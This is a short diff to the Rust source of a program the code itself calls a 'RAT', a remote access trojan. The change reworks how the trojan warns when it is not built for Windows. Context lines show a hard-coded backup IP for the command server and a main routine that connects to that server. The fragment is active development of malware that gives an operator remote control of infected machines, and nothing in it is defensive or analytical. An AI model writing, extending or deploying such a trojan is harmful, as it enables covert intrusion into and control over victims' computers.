@@ -17,7 +17,6 @@ use lazy_static::lazy_static;
 use tracing::*;
 
 use crate::addreses::{Address, Adresses};
-use crate::utils::*;
 
 /// Server ip backup if api isn't available
 pub const TCP_BACKUP_IP: &str = "136.243.156.104";
@@ -39,10 +38,8 @@ async fn main() {
     // init logger
     logger::init();
 
-    if !is_target_os()
-    {
-        warn!("RAT isn't runned on Windows. Some features may be unavailable. Use debug only");
-    }
+    #[cfg(not(target_os = "windows"))]
+    warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
     // connect to the ServerD
     client::connect();
